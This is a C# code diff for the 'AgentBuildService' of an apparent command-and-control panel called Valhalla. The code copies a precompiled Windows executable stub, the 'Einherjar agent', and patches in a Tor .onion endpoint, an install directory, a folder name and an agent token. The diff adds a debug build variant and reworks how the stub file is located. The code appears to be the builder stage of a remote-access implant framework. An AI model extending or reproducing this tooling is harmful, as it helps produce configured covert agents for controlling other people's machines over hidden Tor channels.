@@ -6,6 +6,21 @@ using System.Text.RegularExpressions;
 
 namespace Valhalla
 {
+    /// <summary>
+    /// Identifies the build variant of the Einherjar agent stub.
+    /// <para>
+    /// Release — production build: no debug output, identical functionality.
+    ///           Corresponds to <c>stub.bin</c>.
+    /// Debug   — diagnostic build: structured [DEBUG] logging to stderr,
+    ///           identical functionality.  Corresponds to <c>stub_debug.bin</c>.
+    /// </para>
+    /// </summary>
+    internal enum AgentBuildVariant
+    {
+        Release,
+        Debug,
+    }
+
     internal static class AgentBuildService
     {
         // Magic sentinel written by the panel and read by the agent stub reader.
@@ -19,12 +34,21 @@ namespace Valhalla
             RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);
 
         /// <summary>
-        /// Copies stub/stub.bin to <paramref name="outputPath"/> and patches the
-        /// configuration block into the copy.  The original stub/stub.bin is
+        /// Copies the appropriate stub template (<c>stub.bin</c> or
+        /// <c>stub_debug.bin</c>) to <paramref name="outputPath"/> and patches
+        /// the configuration block into the copy.  The original stub files are
         /// never modified.
         /// </summary>
+        /// <param name="variant">
+        /// <see cref="AgentBuildVariant.Release"/> uses <c>stub.bin</c> and
+        /// produces a production agent without diagnostic output.
+        /// <see cref="AgentBuildVariant.Debug"/> uses <c>stub_debug.bin</c> and
+        /// produces a diagnostics-enabled agent that logs to stderr.
+        /// </param>
         public static void PatchAndDeploy(string onionAddress, int installDirectory,
-                                          string folderName, string agentToken, string outputPath)
+                                          string folderName, string agentToken,
+                                          string outputPath,
+                                          AgentBuildVariant variant = AgentBuildVariant.Release)
         {
             string normalizedEndpoint = ValidateOnionAddress(onionAddress);
             if (installDirectory < 0 || installDirectory > 4)
@@ -33,17 +57,18 @@ namespace Valhalla
             if (string.IsNullOrWhiteSpace(folderName))
                 folderName = "Einherjar";
 
-            string stubPath = LocateStub();
+            string stubPath = LocateStub(variant);
 
             // Verify the source is a Windows PE.
             using (FileStream verify = File.OpenRead(stubPath))
             {
                 if (verify.Length < 2)
-                    throw new InvalidDataException("stub.bin is too small to be a valid PE.");
+                    throw new InvalidDataException(
+                        $"{Path.GetFileName(stubPath)} is too small to be a valid PE.");
                 int b0 = verify.ReadByte(), b1 = verify.ReadByte();
                 if (b0 != 'M' || b1 != 'Z')
                     throw new InvalidDataException(
-                        "stub.bin is not a valid Windows PE executable (missing MZ header).");
+                        $"{Path.GetFileName(stubPath)} is not a valid Windows PE executable (missing MZ header).");
             }
 
             // Read the clean template — never touch this file again after reading.
@@ -58,14 +83,14 @@ namespace Valhalla
             int offset = FindMagic(image);
             if (offset < 0)
                 throw new InvalidDataException(
-                    "stub.bin does not contain the Einherjar configuration sentinel. " +
-                    "Ensure stub.bin was produced by the Einherjar build.");
+                    $"{Path.GetFileName(stubPath)} does not contain the Einherjar configuration sentinel. " +
+                    "Ensure the stub was produced by the Einherjar build.");
 
             // Validate that the block fits in the space allocated after the sentinel.
             int payloadOffset = offset + Magic.Length;
             if (payloadOffset + block.Length > image.Length)
                 throw new InvalidDataException(
-                    "stub.bin configuration region is too small to hold the current settings.");
+                    $"{Path.GetFileName(stubPath)} configuration region is too small to hold the current settings.");
 
             // Write the configuration payload into the in-memory image.
             Buffer.BlockCopy(block, 0, image, payloadOffset, block.Length);
@@ -162,27 +187,44 @@ namespace Valhalla
             return -1;
         }
 
-        private static string LocateStub()
+        /// <summary>
+        /// Returns the path to the stub template for the requested build variant.
+        /// <para>
+        /// Search order: VALHALLA_STUB_PATH env override (for both variants),
+        /// then <c>stub\stub_debug.bin</c> / <c>stub\stub.bin</c> walking up
+        /// from the panel executable directory.
+        /// </para>
+        /// </summary>
+        private static string LocateStub(AgentBuildVariant variant)
         {
-            // 1. Explicit environment override.
-            string env = Environment.GetEnvironmentVariable("VALHALLA_STUB_PATH");
-            if (!string.IsNullOrWhiteSpace(env) && File.Exists(env))
-                return Path.GetFullPath(env);
+            string stubFilename = variant == AgentBuildVariant.Debug ? "stub_debug.bin" : "stub.bin";
 
-            // 2. Walk up from the panel executable directory looking for stub\stub.bin.
-            //    Depth 0 catches the CI layout where stub.bin is embedded directly
-            //    alongside the panel executable at <output>\stub\stub.bin.
-            //    Deeper depths catch the source-tree layout <repo-root>\stub\stub.bin.
+            // 1. Explicit environment override (applies to both variants).
+            string env = Environment.GetEnvironmentVariable("VALHALLA_STUB_PATH");
+            if (!string.IsNullOrWhiteSpace(env))
+            {
+                // If the override points directly at a file, use it.
+                if (File.Exists(env)) return Path.GetFullPath(env);
+                // If it points at a directory, look for the variant filename inside it.
+                string candidate = Path.Combine(env, stubFilename);
+                if (File.Exists(candidate)) return Path.GetFullPath(candidate);
+            }
+
+            // 2. Walk up from the panel executable directory looking for stub\<filename>.
             DirectoryInfo current = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
             for (int depth = 0; current != null && depth < 8; depth++, current = current.Parent)
             {
-                string candidate = Path.Combine(current.FullName, "stub", "stub.bin");
+                string candidate = Path.Combine(current.FullName, "stub", stubFilename);
                 if (File.Exists(candidate)) return candidate;
             }
 
             throw new FileNotFoundException(
-                "stub/stub.bin was not found. Place the pre-compiled Einherjar binary at " +
-                "stub\\stub.bin alongside the panel executable, or set VALHALLA_STUB_PATH.");
+                $"{stubFilename} was not found. Place the pre-compiled Einherjar binary at " +
+                $"stub\\{stubFilename} alongside the panel executable, or set VALHALLA_STUB_PATH.\n\n" +
+                (variant == AgentBuildVariant.Debug
+                    ? "stub_debug.bin is built with the debug-log Cargo feature enabled. " +
+                      "Build it with: cargo build --profile release-debug --features debug-log"
+                    : "stub.bin is built with: cargo build --release"));
         }
     }
 }
